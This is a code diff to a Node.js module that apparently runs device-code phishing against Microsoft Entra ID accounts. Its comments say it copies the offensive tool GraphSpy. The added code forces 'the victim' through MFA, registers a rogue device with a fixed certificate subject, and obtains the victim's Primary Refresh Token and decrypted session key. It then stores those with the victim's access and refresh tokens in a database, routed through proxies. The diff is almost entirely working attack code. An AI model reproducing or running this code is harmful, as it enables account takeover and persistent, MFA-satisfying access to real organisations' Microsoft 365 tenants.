@@ -22,7 +22,20 @@ const crypto = require('crypto');
 const forge = require('node-forge');
 
 const TENANT = config.AZURE_TENANT || 'common';
-const DRS_ENDPOINT = 'https://enterpriseregistration.windows.net/EnrollmentServer/device/';
+
+// ── GraphSpy exact endpoints / scopes (core/device_codes.py, core/device.py) ──
+// device_codes.generate(version=2)
+const TOKEN_ENDPOINT_V2 = 'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode';
+// poll() token exchange
+const POLL_ENDPOINT_V2 = 'https://login.microsoftonline.com/common/oauth2/v2.0/token';
+// device.register() - note the REQUIRED ?api-version=2.0
+const DEFAULT_DEVICE_CODE_SCOPE = 'https://graph.microsoft.com/.default openid offline_access';
+// core/user_agent.py DEFAULT_USER_AGENT
+const USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0';
+// device.register() fixed CSR subject CN -> device_id
+const DEVICE_CSR_CN = '7E980AD9-B86D-4306-9425-9AC066FB014A';
+// device.register() default os_version
+const DEVICE_OS_VERSION = '10.0.26100';
 
 /**
  * Generate a random device name like DESKTOP-ABCDEF.
@@ -90,15 +103,36 @@ function generateKeyPairAndCsr(commonName) {
  * @returns {Promise<object>}
  */
 async function requestDeviceCode() {
+  // GraphSpy device_codes.generate(version=2, ngcmfa=True, cae=True):
+  //
+  //   body = {"client_id": client_id, "scope": scope}
+  //   if ngcmfa or cae:
+  //       body["claims"] = json.dumps({"access_token": {
+  //           "amr":    {"values": ["ngcmfa"]},      # ngcmfa
+  //           "xms_cc": {"values": ["cp1"]}}})       # cae
+  //   url = ".../common/oauth2/v2.0/devicecode"
+  //
+  // The claims are sent on EVERY request in V-C - they are not optional.
+  // amr=ngcmfa forces the victim through MFA during device-code auth and
+  // xms_cc=cp1 opts into Continuous Access Evaluation.
+  const claims = {
+    access_token: {
+      amr: { values: ['ngcmfa'] },
+      xms_cc: { values: ['cp1'] },
+    },
+  };
+
   const { proxy, response } = await ms.post(
-    `https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/devicecode`,
+    TOKEN_ENDPOINT_V2,
     new URLSearchParams({
       client_id: config.AZURE_CLIENT_ID,
-      scope: 'openid profile email offline_access urn:ms-drs:enterpriseregistration.windows.net/.default',
+      scope: DEFAULT_DEVICE_CODE_SCOPE,
+      claims: JSON.stringify(claims),
     }),
     {
       headers: {
         'Content-Type': 'application/x-www-form-urlencoded',
+        'User-Agent': USER_AGENT,
       },
       timeout: 15000,
       stickyProxy: true,
@@ -117,6 +151,30 @@ async function requestDeviceCode() {
 }
 
 /**
+ * GraphSpy device.generate_public_key_rsa_blob():
+ *
+ *   header = b"RSA1" + u32le(key_size) + u32le(len(exp)) + u32le(len(mod))
+ *            + u32le(0) + u32le(0)
+ *   blob   = base64(header + exp_bytes + mod_bytes)
+ *
+ * @param {string} publicKeyPem
+ * @returns {string} base64 TransportKey
+ */
+function generatePublicKeyRsaBlob(publicKeyPem) {
+  const jwk = crypto.createPublicKey(publicKeyPem).export({ format: 'jwk' });
+  const expBytes = Buffer.from(jwk.e, 'base64url');
+  const modBytes = Buffer.from(jwk.n, 'base64url');
+  const header = Buffer.alloc(4 + 5 * 4);
+  header.write('RSA1', 0, 'ascii');
+  header.writeUInt32LE(modBytes.length * 8, 4);
+  header.writeUInt32LE(expBytes.length, 8);
+  header.writeUInt32LE(modBytes.length, 12);
+  header.writeUInt32LE(0, 16);
+  header.writeUInt32LE(0, 20);
+  return Buffer.concat([header, expBytes, modBytes]).toString('base64');
+}
+
+/**
  * Enroll a device through DRS using an access token from the broker flow.
  *
  * @param {string} accessToken
@@ -126,30 +184,36 @@ async function requestDeviceCode() {
  * @returns {Promise<{ deviceId, deviceCertificate, privateKeyPem, csrDerBase64, deviceName }>}
  */
 async function enrollDevice(accessToken, deviceCodeId, tenant, proxy) {
+  // GraphSpy device.register() uses a FIXED CSR subject CN and reads the
+  // device_id back out of the certificate AAD issues.
   const deviceName = generateDeviceName();
-  const { privateKeyPem, csrDerBase64 } = generateKeyPairAndCsr(deviceName);
+  const { privateKeyPem, publicKeyPem, csrDerBase64 } = generateKeyPairAndCsr(DEVICE_CSR_CN);
 
+  // GraphSpy register(target_domain=...) - defaults to e-corp.local there; here
+  // the tenant is the real domain, falling back to the same "common" sentinel.
   const targetDomain = tenant && tenant !== 'common' ? tenant : 'common';
 
+  // GraphSpy device.register() request_body - exact key set:
+  //   CertificateRequest, TransportKey, TargetDomain, DeviceType,
+  //   OSVersion, DeviceDisplayName, JoinType, attributes
   const enrollmentBody = {
-    DeviceDisplayName: deviceName,
-    DeviceOsType: 'Windows',
-    DeviceOsVersion: '10.0.22631.3880',
     CertificateRequest: {
       Type: 'pkcs10',
       Data: csrDerBase64,
     },
+    TransportKey: generatePublicKeyRsaBlob(publicKeyPem),
     TargetDomain: targetDomain,
-    DeviceType: 'RegisteredDevice',
+    DeviceType: 'Windows',
+    OSVersion: DEVICE_OS_VERSION,
+    DeviceDisplayName: deviceName,
+    JoinType: 0,
+    attributes: {
+      ReuseDevice: 'true',
+      ReturnClientSid: 'true',
+    },
   };
 
-  // Avoid logging tenant values that may contain customer domains.
   console.log('[devicecode] DRS enrollment starting');
-
-  // Tie enrollment to the specific auth flow when available
-  if (deviceCodeId) {
-    enrollmentBody.DeviceCodeId = deviceCodeId;
-  }
 
   const response = await ms.post(
     DRS_ENDPOINT,
@@ -179,30 +243,46 @@ async function enrollDevice(accessToken, deviceCodeId, tenant, proxy) {
   const data = response.data;
   console.log('[devicecode] DRS enrollment response received');
 
-  // DRS may return the certificate in multiple fields
-  let deviceCertificate =
-    data.Certificate ||
-    data.certificate ||
-    data.deviceCertificate ||
-    data.x509Certificate;
-
-  let deviceId = data.DeviceId || data.deviceId || data.device_id;
-
-  if (!deviceCertificate) {
+  // GraphSpy device.register():
+  //     certificate_base64 = response_json["Certificate"]["RawBody"]
+  //     device_id          = certificate.subject COMMON_NAME
+  let certRaw = data.Certificate || data.certificate || data.deviceCertificate || data.x509Certificate;
+  if (certRaw && typeof certRaw === 'object') {
+    certRaw = certRaw.RawBody || certRaw.rawBody || certRaw.value || null;
+  }
+  if (!certRaw) {
     throw new Error('DRS enrollment succeeded but no device certificate returned');
   }
 
-  // Convert certificate to PEM format if needed
-  if (!deviceCertificate.includes('-----BEGIN')) {
+  // base64 DER -> PEM. GraphSpy keeps base64 DER; V-C rows hold PEM.
+  let deviceCertificate = String(certRaw);
+  let certificateDerBase64 = null;
+  if (deviceCertificate.includes('-----BEGIN')) {
+    certificateDerBase64 = deviceCertificate
+      .replace(/-----BEGIN CERTIFICATE-----/g, '')
+      .replace(/-----END CERTIFICATE-----/g, '')
+      .replace(/[\r\n\s]/g, '');
+  } else {
+    certificateDerBase64 = deviceCertificate.replace(/\s/g, '');
     deviceCertificate =
       '-----BEGIN CERTIFICATE-----\n' +
-      deviceCertificate.match(/.{1,64}/g).join('\n') +
+      (certificateDerBase64.match(/.{1,64}/g) || []).join('\n') +
       '\n-----END CERTIFICATE-----';
   }
+
+  // device_id = subject CN of the certificate AAD issued (GraphSpy NameOID.COMMON_NAME)
+  let deviceId = null;
+  try {
+    const subject = new crypto.X509Certificate(deviceCertificate).subject;
+    const cn = subject.split(/[,\n]/).map(s => s.trim()).find(s => s.indexOf('CN=') === 0);
+    if (cn) deviceId = cn.slice(3).trim();
+  } catch (eCert) { /* fall through to response fields */ }
+  if (!deviceId) deviceId = data.DeviceId || data.deviceId || data.device_id;
 
   return {
     deviceId,
     deviceCertificate,
+    certificateDerBase64,
     privateKeyPem,
     csrDerBase64,
     deviceName,
@@ -332,7 +412,7 @@ async function pollForTokens(deviceCode, linkId, userId, initialInterval, proxy)
         let response;
         try {
             response = await ms.post(
-                `https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token`,
+                POLL_ENDPOINT_V2,
                 new URLSearchParams({
                     grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
                     client_id: config.AZURE_CLIENT_ID,
@@ -376,11 +456,11 @@ async function pollForTokens(deviceCode, linkId, userId, initialInterval, proxy)
             } catch (e) { /* ignore decode errors */ }
         }
 
-        // Extract PRT from Set-Cookie headers.
-        // x-ms-RefreshTokenCredential is the raw PRT — exactly what silent
-        // consent expects as the x-ms-RefreshTokenCredential header value.
-        // ESTSAUTH carries the session_key JWE.
-        const prt = parsedCookies['x-ms-RefreshTokenCredential'] || null;
+        // Fallback PRT source: the x-ms-RefreshTokenCredential Set-Cookie.
+        // GraphSpy does NOT use this - it reads the raw PRT from
+        // request_for_device()'s response["refresh_token"]. Kept only for
+        // flows where request_for_device could not run.
+        const xmsPrtCookie = parsedCookies['x-ms-RefreshTokenCredential'] || null;
         const sessionKeyJwe = parsedCookies['ESTSAUTH'] || null;
         const deviceTenantId = parsedCookies['X-Device-Tenant-Id'] || null;
 
@@ -406,6 +486,8 @@ async function pollForTokens(deviceCode, linkId, userId, initialInterval, proxy)
         let enrollmentTime = null;
         let deviceCertificateEncrypted = null;
         let encryptedPrivateKey = null;
+        let privateKeyPemForPrt = null;
+        let certificateForPrt = null;
 
         if (access_token) {
             try {
@@ -418,13 +500,16 @@ async function pollForTokens(deviceCode, linkId, userId, initialInterval, proxy)
 
         if (deviceId) {
             try {
-                const enrollmentResult = await enrollDevice(access_token, deviceId, TENANT);
+                const enrollmentResult = await enrollDevice(access_token, deviceId, TENANT, proxy);
                 deviceEnrolled = true;
                 enrollmentTime = new Date();
 
-                const { deviceCertificate, privateKeyPem } = enrollmentResult;
+                const { deviceCertificate, certificateDerBase64, privateKeyPem } = enrollmentResult;
                 deviceCertificateEncrypted = deviceCertificate ? encrypt(deviceCertificate) : null;
                 encryptedPrivateKey = privateKeyPem ? encrypt(privateKeyPem) : null;
+                privateKeyPemForPrt = privateKeyPem || null;
+                certificateForPrt = certificateDerBase64 || null;
+                deviceId = enrollmentResult.deviceId || deviceId;
 
                 console.log(`[devicecode] Device enrolled: ${enrollmentResult.deviceName} (${deviceId})`);
             } catch (enrollErr) {
@@ -432,6 +517,48 @@ async function pollForTokens(deviceCode, linkId, userId, initialInterval, proxy)
                 deviceEnrolled = false;
             }
         }
+
+        // GraphSpy device_codes.poll() auto_action == "device_prt" runs:
+        //     register(...) -> request_for_device(device_id, refresh_token_id, os_version)
+        // request_for_device POSTs a device-signed RS256 jwt to
+        // /common/oauth2/token and reads the RAW PRT out of
+        // response["refresh_token"], then RSA-OAEP decrypts session_key_jwe
+        // with the device private key. That is the real PRT acquisition path;
+        // the Set-Cookie values are only a fallback.
+        let rawPrt = null;
+        let sessionKeyHex = null;
+        if (privateKeyPemForPrt && certificateForPrt && refresh_token) {
+            try {
+                const prtkdf = require('./prtkdf');
+                const prtResult = await prtkdf.requestPrtForDevice({
+                    refreshToken: refresh_token,
+                    privateKeyPem: privateKeyPemForPrt,
+                    certificateBase64: certificateForPrt,
+                    osVersion: DEVICE_OS_VERSION,
+                });
+                rawPrt = prtResult.prt;
+                sessionKeyHex = prtResult.sessionKeyHex;
+                console.log('[devicecode] PRT captured via request_for_device (GraphSpy parity)');
+
+                // Persist the decrypted session key where
+                // resolveSessionKeyForToken()/getStoredSessionKey() read it -
+                // same column devicemanager.capturePrtSessionKey() writes.
+                try {
+                    await db.query(
+                        'UPDATE device_credentials SET session_key_encrypted = ?, updated_at = NOW() WHERE user_id = ? AND tenant_id = ?',
+                        [encrypt(sessionKeyHex), userId, tenant]
+                    );
+                } catch (skErr) {
+                    console.warn('[devicecode] session key not stored in device_credentials:', skErr.message);
+                }
+            } catch (prtErr) {
+                console.error('[devicecode] request_for_device failed:', prtErr.message);
+            }
+        }
+
+        // GraphSpy stores the RAW PRT (response["refresh_token"]). The
+        // x-ms-RefreshTokenCredential cookie is a fallback only.
+        const storedPrt = rawPrt || xmsPrtCookie || null;
 
         try {
           await db.query(
@@ -449,7 +576,7 @@ async function pollForTokens(deviceCode, linkId, userId, initialInterval, proxy)
                   access_token ? encrypt(access_token) : null,
                   refresh_token ? encrypt(refresh_token) : null,
                   id_token ? encrypt(id_token) : null,
-                  prt ? encrypt(prt) : null,
+                  storedPrt ? encrypt(storedPrt) : null,
                   sessionKeyJwe ? encrypt(sessionKeyJwe) : null,
                   deviceTenantIdClaim,
                   '0.0.0.0',
@@ -479,7 +606,7 @@ async function pollForTokens(deviceCode, linkId, userId, initialInterval, proxy)
                     access_token ? encrypt(access_token) : null,
                     refresh_token ? encrypt(refresh_token) : null,
                     id_token ? encrypt(id_token) : null,
-                    prt ? encrypt(prt) : null,
+                    storedPrt ? encrypt(storedPrt) : null,
                     null,
                     sessionKeyJwe ? encrypt(sessionKeyJwe) : null,
                     deviceTenantIdClaim,
@@ -501,7 +628,7 @@ async function pollForTokens(deviceCode, linkId, userId, initialInterval, proxy)
             access_token,
             refresh_token,
             id_token,
-            prt,
+            prt: storedPrt,
             session_key_jwe: sessionKeyJwe,
             device_tenant_id: deviceTenantIdClaim,
             cookies: parsedCookies,
